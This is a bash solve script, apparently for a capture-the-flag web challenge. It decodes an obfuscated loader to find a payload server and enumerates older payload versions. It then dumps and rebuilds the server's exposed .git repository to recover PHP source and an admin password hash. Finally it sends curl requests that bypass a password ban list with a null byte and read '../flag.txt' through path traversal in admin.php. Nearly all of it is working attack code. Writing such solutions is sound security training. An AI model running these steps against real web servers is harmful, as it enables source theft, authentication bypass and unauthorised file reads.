#!/bin/bash

# IF TESTING LOCALLY: set $LOCAL_CONTAINER to a nonempty value

# Set this for prod testing
handout_url=''
loader=$(curl "${handout_url}" || cat loader)

# decode loader to extract URL
decoded1=$(echo "${loader}" | sed -E 's/^[^"]+"(.+)".*$/\1/' | base64 -d)
#echo "${decoded1}"
url=$(echo "${decoded1}" | sed -E "s/^.+'[^']+'[^']+'(.+)'.+$/\1/" | base64 -d)
echo "secondary payload URL: ${url}"

# decode URL param
param=$(echo "${url}" | sed -E "s/^.+=(.+)$/\1/" | sed 's/%3D/=/' | base64 -d)
echo "decoded param: ${param}"

if [[ -n $LOCAL_CONTAINER ]]; then
    url_no_param=$(echo "${url}" | sed -E 's/^(.+=).+$/\1/')
else
    #local testing only
    url_no_param='http://127.1:8000/get_update.php?version='
    #/local testing
fi
base_url=$(echo "${url_no_param}" | sed -E 's#^(http(s?)://[^/]+)/.*$#\1#')

#-------------------------------------------------------------------
# do some light payload version enumeration for recon
#-------------------------------------------------------------------

# param is "v2"
# enumerate for older versions
declare -a secondary_payloads
for i in 'v2' 'v1' 'v0'; do
    secondary_payloads[$i]=$(curl "${url_no_param}$(echo -n "${i}" | base64 | sed 's/\=/%3D/g')")
done

#-------------------------------------------------------------------
# confirm evidence of possible exposed .git
#-------------------------------------------------------------------
grep -n '.git/HEAD' <<<"${secondary_payloads[0]}"

#-------------------------------------------------------------------
# retrieve exposed git index and parse out object info
#-------------------------------------------------------------------
index_file='tmp/amateur-git-index'
mkdir tmp
curl -s "${base_url}/.git/index" -o "${index_file}"

parse_obj_names_py='
import sys

path = sys.argv[1]
with open(path, "rb") as f:
    data = f.read()

header_len = 12
entry_count = int.from_bytes(data[8:12], byteorder="big")
entries = data[header_len:]

obj_name_len = 20
pos = 0
for _ in range(entry_count):
    entry = entries[pos:pos+40]
    pos += 40
    obj_name = entries[pos:pos+obj_name_len]
    entry += obj_name
    pos += obj_name_len
    name_len = int.from_bytes(entries[pos:pos+2], byteorder="big")
    entry += entries[pos:pos+2]
    pos += 2
    name_bytes=entries[pos:pos+name_len]
    entry += name_bytes
    name = str(name_bytes, "utf8")
    pos += name_len
    print(f"{obj_name.hex()[:2]} {obj_name.hex()[2:]} {name} {entry.hex()}")
    if len(entry) % 8 != 0:
        pos += 8 - (len(entry) % 8)
'

parsed_index=$(python3 -c "${parse_obj_names_py}" "${index_file}")
echo "${parsed_index}"

#-------------------------------------------------------------------
# Clone and reconstruct the files tracked in the
# exposed .git
#-------------------------------------------------------------------
mkdir -p 'tmp/amateur'
cd 'tmp/amateur'
git init
mkdir -p .git/objects
echo "${parsed_index}" | while read -a line; do
    mkdir -p ".git/objects/${line[0]}"
    curl "${base_url}/.git/objects/${line[0]}/${line[1]}" -o ".git/objects/${line[0]}/${line[1]}"
done
mv ../amateur-git-index .git/index
git restore *.php
git restore *.txt

cd ../..

#-------------------------------------------------------------------
# confirm admin password hash exposed in admin.php
#-------------------------------------------------------------------
grep -n 'hash' tmp/amateur/admin.php

#-------------------------------------------------------------------
# Exploit!
# - abuse non-binary-safe hashing functions to bypass wordlist-based
#   password ban
# - use path traversal in `cat` command to read flag
#-------------------------------------------------------------------

# from cracking the hash hardcoded in admin.php
# using the banned pw lists in recovered TXT files
admin_pass="i<3php"

flag_path='../flag.txt'
password="${admin_pass}%00lol"
curl -vs "${base_url}/admin.php" --data "pass=${password}&cmd=list_payloads"
params="pass=${password}&cmd=inspect_payload&filename=${flag_path}"
flag=$(curl -vs "${base_url}/admin.php" --data "${params}")

echo "flag: ${flag}"
